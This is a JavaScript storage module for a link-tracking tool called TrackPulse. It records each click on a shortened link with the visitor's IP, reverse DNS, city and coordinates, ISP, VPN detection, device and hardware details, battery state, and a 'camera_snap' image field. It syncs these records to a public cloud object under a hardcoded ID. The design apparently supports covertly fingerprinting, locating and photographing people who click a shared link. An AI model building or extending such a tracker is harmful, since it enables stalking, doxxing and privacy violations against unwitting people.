const fs = require('fs');
const path = require('path');
const axios = require('axios');

// Cloud Database Object ID on RESTful Cloud Database
let CLOUD_OBJECT_ID = process.env.CLOUD_OBJECT_ID || 'ff808181a09d98f701a0c3972c455fe4';
let CLOUD_DB_URL = `https://api.restful-api.dev/objects/${CLOUD_OBJECT_ID}`;

// Local file fallback
let localDbPath = path.join(__dirname, 'data.json');
try {
  fs.accessSync(__dirname, fs.constants.W_OK);
} catch (err) {
  localDbPath = path.join('/tmp', 'data.json');
}

// Initial clean schema structure
const defaultData = {
  links: [],
  click_logs: [],
  nextLinkId: 1,
  nextLogId: 1
};

// In-memory cache
let memoryCache = null;

// Helper to sanitize database object
function sanitizeDbData(data) {
  if (!data || typeof data !== 'object') return { ...defaultData };
  if (!Array.isArray(data.links)) data.links = [];
  if (!Array.isArray(data.click_logs)) data.click_logs = [];

  data.links = data.links.filter(l => l && l.short_code).map((l, index) => {
    let validId = parseInt(l.id);
    if (isNaN(validId)) validId = index + 1;
    return {
      id: String(validId),
      short_code: String(l.short_code),
      title: String(l.title || l.short_code),
      destination_url: String(l.destination_url || 'https://google.com'),
      created_at: l.created_at || new Date().toISOString()
    };
  });

  data.click_logs = data.click_logs.filter(c => c && c.ip_address).map((c, index) => {
    let validId = parseInt(c.id);
    if (isNaN(validId)) validId = index + 1;
    let validLinkId = parseInt(c.link_id);
    if (isNaN(validLinkId)) validLinkId = 1;
    return {
      id: String(validId),
      link_id: String(validLinkId),
      ip_address: String(c.ip_address),
      reverse_dns: String(c.reverse_dns || 'N/A'),
      country: String(c.country || 'Unknown'),
      countryCode: String(c.countryCode || ''),
      region: String(c.region || 'Unknown'),
      city: String(c.city || 'Unknown'),
      isp: String(c.isp || 'Unknown'),
      org: String(c.org || 'Unknown'),
      lat: Number(c.lat) || 0,
      lon: Number(c.lon) || 0,
      is_proxy: Boolean(c.is_proxy),
      is_mobile_net: Boolean(c.is_mobile_net),
      is_hosting: Boolean(c.is_hosting),
      user_agent: String(c.user_agent || ''),
      browser: String(c.browser || 'Unknown'),
      os: String(c.os || 'Unknown'),
      device: String(c.device || 'Desktop'),
      device_model: String(c.device_model || 'Generic Device'),
      screen_res: String(c.screen_res || 'N/A'),
      timezone: String(c.timezone || 'N/A'),
      gpu: String(c.gpu || 'N/A'),
      cpu_cores: String(c.cpu_cores || 'N/A'),
      connection_type: String(c.connection_type || 'N/A'),
      language: String(c.language || 'N/A'),
      battery: String(c.battery || 'N/A'),
      camera_snap: c.camera_snap || null,
      created_at: c.created_at || new Date().toISOString()
    };
  });

  data.nextLinkId = (data.links.reduce((max, l) => Math.max(max, parseInt(l.id) || 0), 0) + 1);
  data.nextLogId = (data.click_logs.reduce((max, c) => Math.max(max, parseInt(c.id) || 0), 0) + 1);

  return data;
}

// Fetch data from Cloud Database
async function fetchCloudData() {
  // If memoryCache is already populated in this execution context, use memoryCache first
  if (memoryCache && memoryCache.links && memoryCache.click_logs && memoryCache.click_logs.length > 0) {
    return memoryCache;
  }

  try {
    const res = await axios.get(CLOUD_DB_URL, { timeout: 3000 });
    if (res.data && res.data.data && Array.isArray(res.data.data.links)) {
      const cleanData = sanitizeDbData(res.data.data);
      memoryCache = cleanData;
      saveLocalData(cleanData);
      return cleanData;
    }
  } catch (err) {}
  return loadLocalData();
}

// Push data to Cloud Database
async function saveCloudData(data) {
  const cleanData = sanitizeDbData(data);
  memoryCache = cleanData;
  saveLocalData(cleanData);
  try {
    await axios.put(CLOUD_DB_URL, {
      name: 'TrackPulse Database',
      data: cleanData
    }, { timeout: 3500 });
  } catch (err) {
    console.error('Cloud DB sync error:', err.message);
  }
}

function loadLocalData() {
  if (memoryCache) return memoryCache;
  try {
    if (fs.existsSync(localDbPath)) {
      const content = fs.readFileSync(localDbPath, 'utf8');
      const data = JSON.parse(content);
      memoryCache = sanitizeDbData(data);
      return memoryCache;
    }
  } catch (e) {}
  memoryCache = { ...defaultData };
  return memoryCache;
}

function saveLocalData(data) {
  try {
    fs.writeFileSync(localDbPath, JSON.stringify(data, null, 2), 'utf8');
  } catch (e) {}
}

module.exports = {
  initSync: async () => {
    await fetchCloudData();
  },

  // Create Link
  createLink: async (shortCode, title, destinationUrl) => {
    await fetchCloudData();
    const data = loadLocalData();
    
    const newId = String(data.links.reduce((max, l) => Math.max(max, parseInt(l.id) || 0), 0) + 1);
    const newLink = {
      id: newId,
      short_code: String(shortCode),
      title: String(title),
      destination_url: String(destinationUrl),
      created_at: new Date().toISOString()
    };
    data.links.push(newLink);
    await saveCloudData(data);
    return newLink;
  },

  // Get All Links
  getAllLinks: async () => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.links.map(l => {
      const clickCount = data.click_logs.filter(c => String(c.link_id) === String(l.id)).length;
      return {
        ...l,
        total_clicks: clickCount
      };
    }).sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  // Get Link By Short Code
  getLinkByShortCode: async (shortCode) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.links.find(l => String(l.short_code).toLowerCase() === String(shortCode).toLowerCase()) || null;
  },

  // Delete Link
  deleteLink: async (id) => {
    await fetchCloudData();
    const data = loadLocalData();
    const strId = String(id);
    data.links = data.links.filter(l => String(l.id) !== strId);
    data.click_logs = data.click_logs.filter(c => String(c.link_id) !== strId);
    await saveCloudData(data);
    return true;
  },

  // Log Click
  logClick: async (logData) => {
    await fetchCloudData();
    const data = loadLocalData();

    const newId = String(data.click_logs.reduce((max, c) => Math.max(max, parseInt(c.id) || 0), 0) + 1);
    const newLog = {
      id: newId,
      link_id: String(logData.linkId),
      ip_address: String(logData.ipAddress),
      reverse_dns: String(logData.reverseDns || 'N/A'),
      country: String(logData.country || 'Unknown'),
      countryCode: String(logData.countryCode || ''),
      region: String(logData.region || 'Unknown'),
      city: String(logData.city || 'Unknown'),
      isp: String(logData.isp || 'Unknown'),
      org: String(logData.org || 'Unknown'),
      lat: Number(logData.lat) || 0,
      lon: Number(logData.lon) || 0,
      is_proxy: Boolean(logData.isProxy),
      is_mobile_net: Boolean(logData.isMobileNet),
      is_hosting: Boolean(logData.isHosting),
      user_agent: String(logData.userAgent || ''),
      browser: String(logData.browser || 'Unknown'),
      os: String(logData.os || 'Unknown'),
      device: String(logData.device || 'Desktop'),
      device_model: String(logData.deviceModel || 'Generic Device'),
      screen_res: String(logData.screenRes || 'N/A'),
      timezone: String(logData.timezone || 'N/A'),
      gpu: String(logData.gpu || 'N/A'),
      cpu_cores: String(logData.cpuCores || 'N/A'),
      connection_type: String(logData.connectionType || 'N/A'),
      language: String(logData.language || 'N/A'),
      battery: String(logData.battery || 'N/A'),
      camera_snap: logData.cameraSnap || null,
      created_at: new Date().toISOString()
    };
    data.click_logs.push(newLog);
    await saveCloudData(data);
    return newLog;
  },

  // Update Client Data (GPU, Screen, Camera Snap)
  updateLogClientData: async (logId, clientData) => {
    await fetchCloudData();
    const data = loadLocalData();
    const log = data.click_logs.find(c => String(c.id) === String(logId));
    if (log) {
      if (clientData.screenRes) log.screen_res = String(clientData.screenRes);
      if (clientData.timezone) log.timezone = String(clientData.timezone);
      if (clientData.gpu) log.gpu = String(clientData.gpu);
      if (clientData.cpuCores) log.cpu_cores = String(clientData.cpuCores);
      if (clientData.connectionType) log.connection_type = String(clientData.connectionType);
      if (clientData.language) log.language = String(clientData.language);
      if (clientData.battery) log.battery = String(clientData.battery);
      if (clientData.deviceModel && clientData.deviceModel !== 'N/A') log.device_model = String(clientData.deviceModel);
      if (clientData.cameraSnap) log.camera_snap = String(clientData.cameraSnap);
      await saveCloudData(data);
    }
  },

  // Get Logs By Link ID
  getLogsByLinkId: async (linkId) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.click_logs
      .filter(c => String(c.link_id) === String(linkId))
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
  },

  // Get All Logs
  getAllLogs: async (limit = 100) => {
    await fetchCloudData();
    const data = loadLocalData();
    return data.click_logs
      .map(c => {
        const link = data.links.find(l => String(l.id) === String(c.link_id));
        return {
          ...c,
          link_title: link ? link.title : 'Deleted Link',
          short_code: link ? link.short_code : 'N/A'
        };
      })
      .sort((a, b) => new Date(b.created_at) - new Date(a.created_at))
      .slice(0, limit);
  },

  // Get Stats
  getStats: async () => {
    await fetchCloudData();
    const data = loadLocalData();
    const totalLinks = data.links.length;
    const totalClicks = data.click_logs.length;
    const uniqueIPs = new Set(data.click_logs.map(c => c.ip_address)).size;
    const vpnCount = data.click_logs.filter(c => c.is_proxy).length;

    const locMap = {};
    data.click_logs.forEach(c => {
      if (c.country && c.country !== 'Unknown') {
        const key = `${c.city}, ${c.country}`;
        locMap[key] = (locMap[key] || 0) + 1;
      }
    });

    const topLocations = Object.entries(locMap)
      .map(([loc, count]) => ({ location: loc, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5);

    return { totalLinks, totalClicks, uniqueIPs, vpnCount, topLocations };
  }
};
